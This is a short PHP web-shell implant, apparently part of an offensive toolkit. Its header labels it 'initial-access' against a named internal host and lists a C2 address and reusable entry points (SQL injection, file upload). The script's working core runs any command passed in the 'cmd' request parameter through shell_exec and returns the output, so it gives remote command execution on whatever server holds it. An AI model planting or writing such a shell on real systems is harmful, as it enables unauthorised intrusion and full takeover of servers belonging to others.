#!/usr/bin/env php
<?php
/**
 * implant-webshell-10-80-10-24.php
 * Category: initial-access | Node: 10.80.10.24 | Reusable: portal-sqli, edge-upload
 * Usage: php implant-{payload_type}.php TARGET={target} C2={c2_addr}
 */
set_error_handler(function($errno, $errstr) { throw new ErrorException($errstr, 0, $errno); });

$TARGET = getenv("TARGET") ?: "10.80.10.24";
$C2 = getenv("C2_ADDR") ?: "10.80.0.10:4444";
$TYPE = getenv("PAYLOAD_TYPE") ?: "webshell";

if (!$TARGET) {
    fwrite(STDERR, "ERROR: TARGET required\n");
    exit(1);
}

echo "[implant] Deploying $TYPE to $TARGET, C2=$C2\n";

$cmd = $_REQUEST["cmd"] ?? "";
if ($cmd) {
    $out = shell_exec($cmd . " 2>&1");
    echo "<pre>" . htmlspecialchars($out) . "</pre>";
}

echo "[implant] Ready. POST cmd=... to this file.\n";
